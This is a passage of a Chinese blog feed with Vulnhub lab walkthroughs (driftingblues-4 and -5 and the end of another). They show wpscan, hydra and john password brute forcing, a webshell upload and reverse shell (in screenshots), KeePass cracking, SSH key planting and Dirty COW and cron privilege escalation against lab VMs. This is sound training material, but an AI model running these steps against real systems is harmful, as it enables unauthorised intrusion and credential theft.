class="language-bash">zip2john spammer.zip <span class="token operator">>></span> MS02423.txtjohn MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221163153323.png" alt="image-20240221163153323"></p><p>方法三.ARCHPR爆破</p><p>字典我们使用kali自带的字典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221162609463.png" alt="image-20240221162609463"></p><p>密码是myspace4</p><p>我们打开压缩包，发现用户名和密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mayer:lionheart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-登录页面"><a href="#7-登录页面" class="headerlink" title="7)登录页面"></a>7)登录页面</h3><p>我们登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221163636175.png" alt="image-20240221163636175"></p><h3 id="8-文件上传漏洞"><a href="#8-文件上传漏洞" class="headerlink" title="8)文件上传漏洞"></a>8)文件上传漏洞</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.14/textpattern/textpattern/index.php?event<span class="token operator">=</span>file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们发现是一个文件上传框架，我们上传一句话木马</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221164230828.png" alt="image-20240221164230828"></p><p>我们进行连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221164511348.png" alt="image-20240221164511348"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221164535432.png" alt="image-20240221164535432"></p><h3 id="9-反弹shell"><a href="#9-反弹shell" class="headerlink" title="9)反弹shell"></a>9)反弹shell</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221164757336.png" alt="image-20240221164757336"></p><p>我们可以看到反弹成功</p><h3 id="10-提权"><a href="#10-提权" class="headerlink" title="10)提权"></a>10)提权</h3><p>查看文件和权限都没发现什么，查看 SUID 文件，也没有什么可以提权的了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221165349189.png" alt="image-20240221165349189"></p><p>也没什么可以提权的， linpeas.sh 跑一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221200244675.png" alt="image-20240221200244675"></p><p>发现脏牛漏洞，在 github 上找了<a href="https://github.com/gbonacini/CVE-2016-5195%EF%BC%8C%E4%B8%8B%E8%BD%BD%E8%BF%90%E8%A1%8C%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96flag%E4%BA%86">https://github.com/gbonacini/CVE-2016-5195，下载运行，我们就可以获取flag了</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240221203648828.png" alt="image-20240221203648828"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-5</title>
    <link href="http://ms02423.top/2024/02/19/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-5/"/>
    <id>http://ms02423.top/2024/02/19/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-5/</id>
    <published>2024-02-19T12:46:53.000Z</published>
    <updated>2024-02-20T14:55:45.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get flagsdifficulty: easyabout vm: tested and exported from virtualbox. dhcp and nested vtx/amdv enabled. you can contact me by email <span class="token keyword">for</span> troubleshooting or questions.This works better with VirtualBox rather than VMware.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-5,662/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219204909314.png" alt="image-20240219204909314"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219204940902.png" alt="image-20240219204940902"></p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219205146654.png" alt="image-20240219205146654"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219205243248.png" alt="image-20240219205243248"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">靶场真实ip为192.168.1.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219210946691.png" alt="image-20240219210946691"></p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219211056872.png" alt="image-20240219211056872"></p><p>我们可以看到框架是wordpress，猜测是wordpress登录，需要爆破</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描网站"><a href="#1-nikto扫描网站" class="headerlink" title="1)nikto扫描网站"></a>1)nikto扫描网站</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219211348186.png" alt="image-20240219211348186"></p><p>我们扫描到2个目录，一个是登录页面，另一个是文件上传路径</p><h3 id="2-dirsearch目录扫描"><a href="#2-dirsearch目录扫描" class="headerlink" title="2)dirsearch目录扫描"></a>2)dirsearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.12 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219211758373.png" alt="image-20240219211758373"></p><p>目前我们掌握的信息是wordpress登录页面和一个文件上传路径</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-wpscan爆破"><a href="#1-wpscan爆破" class="headerlink" title="1)wpscan爆破"></a>1)wpscan爆破</h3><p>我们爆破用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.1.12 <span class="token parameter variable">-e</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219213352029.png" alt="image-20240219213352029"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219213439506.png" alt="image-20240219213439506"></p><p>我们爆破出来5个用户名，我们创建字典</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl http://192.168.1.12/ <span class="token operator">></span> MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219213723395.png" alt="image-20240219213723395"></p><p>我们进行爆破即可</p><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">wpscan --url http:&#x2F;&#x2F;192.168.1.12 -U &#39;&#x2F;home&#x2F;kali&#x2F;桌面&#x2F;1.txt&#39;  -P MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219214441531.png" alt="image-20240219214441531"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219214458360.png" alt="image-20240219214458360"></p><p>我们爆破出来一个用户名和密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">gill<span class="token punctuation">:</span>interchangeable <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-wordpress登录"><a href="#2-wordpress登录" class="headerlink" title="2)wordpress登录"></a>2)wordpress登录</h3><p>我们进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219214803830.png" alt="image-20240219214803830"></p><p>我们进行查看，但是没有发现有用的信息</p><h3 id="3-访问文件上传路径"><a href="#3-访问文件上传路径" class="headerlink" title="3)访问文件上传路径"></a>3)访问文件上传路径</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.12/wp-content/uploads/2021/02/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以看到是6个图片，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219212026753.png" alt="image-20240219212026753"></p><p>前面5个图片都是首页的图片，所以我们就不用查看了，我们直接查看第六个图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219212325683.png" alt="image-20240219212325683"></p><p>我们下载到kali里面，进行查看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.1.12/wp-content/uploads/2021/02/dblogo.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219212505996.png" alt="image-20240219212505996"></p><p>这里使用一个工具exiftool, 这个工具用来对EXIF信息解析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">exiftool dblogo.png <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219215235795.png" alt="image-20240219215235795"></p><p>我们得到了ssh登录的密码，我们进行登录59583hello</p><h3 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4)ssh登录"></a>4)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> gill@192.168.1.12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219215514583.png" alt="image-20240219215514583"></p><p>我们可以看到登录成功，我们查看根目录可以看到一个user.txt</p><p>我们进行查看，找到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219215648534.png" alt="image-20240219215648534"></p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219215812292.png" alt="image-20240219215812292"></p><p>但是没有找到任何可以提权的，我们发现在根目录下，有一个keyfile.kdbx文件（第一次遇到这种文件)什么是DKBX文件？</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.solvusoft.com/zh-cn/file-extensions/file-extension-kdbx/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220222142386.png" alt="image-20240220222142386"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220222614479.png" alt="image-20240220222614479"></p><p>我们开启临时web服务，但是报错了，我们使用另一条命令</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">python <span class="token operator">-</span>m SimpleHTTPServer <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220222843819.png" alt="image-20240220222843819"></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">scp gill@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.12</span><span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>gill<span class="token operator">/</span>key<span class="token operator">*</span> <span class="token operator">/</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是一个使用SCP（Secure Copy Protocol）命令的示例，该命令用于在远程计算机和本地计算机之间安全地复制文件。具体来说，这个命令是将远程计算机上gill用户的&#x2F;home&#x2F;gill&#x2F;目录中以”key”开头的文件复制到本地计算机的&#x2F;root&#x2F;目录。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220223515818.png" alt="image-20240220223515818"></p><p>将 keyfile.kdbx 内容转为 john 支持的格式：</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">keepass2john keyfile<span class="token punctuation">.</span>kdbx <span class="token operator">></span> Keepasshash<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用john破解密码：</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">john --wordlist<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span>rockyou<span class="token punctuation">.</span>txt Keepasshash<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220224257030.png" alt="image-20240220224257030"></p><p>我们进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://app.keeweb.info/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>KeeWeb 是一个开源的密码管理器，类似于 KeePass。它提供了一个用户友好的界面，允许用户存储和管理他们的密码，并使用加密技术来保护这些密码。KeeWeb 可以与多个平台和设备兼容，并且用户可以选择在本地存储密码数据库，或者使用云服务进行同步</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220224836713.png" alt="image-20240220224836713"></p><p>发现了六个密码分别为：</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">2real4surreal buddyretardcloset313exaltedfracturedoceanzakkwylde<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试使用这些密码进去 但是并没有发现可用的信息，靶机下载pspy64：<a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64%EF%BC%8C%E4%BD%BF%E7%94%A8WinSCP%E6%8A%8Apspy64%E4%BC%A0%E5%88%B0%E9%9D%B6%E6%9C%BA%E7%9A%84/home/gill/%E4%B8%AD">https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64，使用WinSCP把pspy64传到靶机的/home/gill/中</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220225128325.png" alt="image-20240220225128325"></p><pre class="line-numbers language-none"><code class="language-none">chmod 777 pspy64.&#x2F;pspy64 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现了根目录下，每分钟就执行一个key.sh的脚本文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220225241069.png" alt="image-20240220225241069"></p><p>使用keyfile.kdbx文件中的名称，新建文件fracturedocean然后建立正确的文件名 就会获得一个新的文件rootcreds.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220225333284.png" alt="image-20240220225333284"></p><p>如果生成了cat一下发现了 root的账号密码！！！</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220225406863.png" alt="image-20240220225406863"></p><p>查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240220225435590.png" alt="image-20240220225435590"></p><h1 id="四-相关知识"><a href="#四-相关知识" class="headerlink" title="四.相关知识"></a>四.相关知识</h1><p>1.cewl 生成字典和wpscan 工具暴力破解的使用<br>2.Exiftool 这个工具用来对EXIF信息解析(第一次了解这个工具的使用和作用)<br>3..kdbx文件密码破解（新知识点，第一次做花的时间比较多）<br>4.如果临时开启不了web服务 可以使用scp 这个命令（非常好用！！）<br>5.解密 keepass 数据库获取密码（虽然没啥用 但是也是第一次了解 新知识点）<br>6.定时提权 下载脚本pspy64 查看 创建key 文件提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-4</title>
    <link href="http://ms02423.top/2024/02/19/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-4/"/>
    <id>http://ms02423.top/2024/02/19/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-4/</id>
    <published>2024-02-19T07:22:53.000Z</published>
    <updated>2024-02-19T10:44:41.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested  vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span>  questions<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>driftingblues-4<span class="token punctuation">,</span><span class="token number">661</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153447919.png" alt="image-20240219153447919"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153529617.png" alt="image-20240219153529617"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">我们不知道靶场ip地址，但是我们知道网段是<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>，我们进行探测即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153856132.png" alt="image-20240219153856132"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153943877.png" alt="image-20240219153943877"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场的ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154231337.png" alt="image-20240219154231337"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">发现开启了21端口, 服务为ftp发现开启了22端口,服务为OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了80端口，服务为Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154558941.png" alt="image-20240219154558941"></p><p>我们查看页面，没有发现任何有用的信息，我们进行查看源代码，发现一串base64编码，我们一会进行解密查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154703757.png" alt="image-20240219154703757"></p><p>开启了21端口，我们进行查看ftp服务，但是不能进行匿名访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp://192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154817885.png" alt="image-20240219154817885"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155004013.png" alt="image-20240219155004013"></p><p>没有任何信息</p><h3 id="2-dirsearch目录扫描"><a href="#2-dirsearch目录扫描" class="headerlink" title="2)dirsearch目录扫描"></a>2)dirsearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.10 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155336937.png" alt="image-20240219155336937"></p><p>什么也没有，目前我们掌握的信息，只有一串base64编码，我们进行解密查看</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-解密"><a href="#1-解密" class="headerlink" title="1)解密"></a>1)解密</h3><p>我们进行解密base64,一共需要解密4次</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155604191.png" alt="image-20240219155604191"></p><p>我们发现是一个目录，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.10/imfuckingmad.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155717756.png" alt="image-20240219155717756"></p><p>发现是Brainfuck编码，我们进行解密，发现是一个二维码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219161522517.png" alt="image-20240219161522517"></p><h3 id="2-扫描二维码"><a href="#2-扫描二维码" class="headerlink" title="2)扫描二维码"></a>2)扫描二维码</h3><p>我们进行扫描</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219161542342.png" alt="image-20240219161542342"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219161616928.png" alt="image-20240219161616928"></p><p>我们发现一个网址，我们进行访问发现4个用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://i.imgur.com/a4JjS76.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219164140157.png" alt="image-20240219164140157"></p><p>在之前我们访问ftp访问的时候，发现需要用户名进行登录，那么我们进行爆破试试</p><h3 id="3-hydra爆破"><a href="#3-hydra爆破" class="headerlink" title="3)hydra爆破"></a>3)hydra爆破</h3><p>我们使用hydra进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> <span class="token string">'/home/kali/桌面/1.txt'</span>  <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt ftp://192.168.1.10 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219172149703.png" alt="image-20240219172149703"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">破解出一个 FTP登录的用户名和密码：luther<span class="token operator">/</span>mypics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219172351175.png" alt="image-20240219172351175"></p><p>是 sync（linux同步命令，含义为迫使缓冲块数据立即写盘并更新超级块），那我尝试往 ftp 中的 hubert 文件中写入 ssh 密钥，猜测应该就会同步到 hubert 用户的家目录中，现在 ftp 中的 hubert 目录下创建 .ssh 目录</p><h3 id="4-制作ssh私钥"><a href="#4-制作ssh私钥" class="headerlink" title="4)制作ssh私钥"></a>4)制作ssh私钥</h3><p>首先先在kaii本地生成秘钥ssh-keygen 将 id_rsa.pub SSH公钥文件另存为 authorized_keys</p><pre class="line-numbers language-none"><code class="language-none">ssh—keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219174426188.png" alt="image-20240219174426188"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219174455466.png" alt="image-20240219174455466"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180150587.png" alt="image-20240219180150587"></p><p>然后我们在hubert目录下创建.ssh目录，我之前就已经创建好了.ssh目录，所以这里就不在创建了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180336574.png" alt="image-20240219180336574"></p><p>我们上传authorized_keys到靶场里面，我们可以看到上传成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180427738.png" alt="image-20240219180427738"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180442341.png" alt="image-20240219180442341"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">400</span> id_rsa   <span 